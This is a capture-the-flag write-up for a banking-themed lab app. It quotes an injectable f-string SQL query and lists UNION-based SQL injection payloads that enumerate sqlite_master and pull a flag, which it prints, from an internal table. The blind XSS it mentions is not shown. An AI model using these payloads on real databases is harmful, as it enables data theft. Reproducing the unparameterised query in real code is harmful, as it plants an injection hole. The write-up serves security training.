# Secure_BankSys CTF Challenge Solution

This challenge combines two vulnerabilities:
1. SQL Injection in the search functionality
2. Blind XSS in the admin dashboard that displays search logs

## Part 1: SQL Injection Exploitation

The vulnerability is in the `/search` route in `app.py`:

```python
sql_query = f"SELECT account_number, customer_name, balance, account_type FROM accounts WHERE account_number LIKE '%{query}%' OR customer_name LIKE '%{query}%' OR account_type LIKE '%{query}%'"
```

The user input is directly concatenated into the SQL query without parameterization, making it vulnerable to SQL injection.

### Step 1: Verify the SQL Injection

First, we can test for SQL injection with a simple payload:

```
' OR '1'='1
```

This should return all accounts in the database, confirming the SQL injection vulnerability.

### Step 2: Enumerate the Database

We can explore the database structure with UNION-based injection:

```
' UNION SELECT 1,2,3,4 --
```

This will help us determine the number of columns (4) and their data types.

To find the table names:

```
' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --
```

This should reveal the tables: `accounts`, `users`, `internal_data`, and `search_logs`.

### Step 3: Extract the columns names


```' UNION SELECT 1,2,3,sql FROM sqlite_master WHERE tbl_name = 'internal_data' -- - ```
to find the columns names 


### Step 4: Extract the Flag

Now that we know there's an `internal_data` table, we can extract its contents:

```
' UNION SELECT 1, content, 3, 4 FROM internal_data --
```

This should reveal the flag: `Spark{G00d_J0B_K1nG_Y0u_4R3_C00k1nGG_1ZSQMLK9LQSX21}`

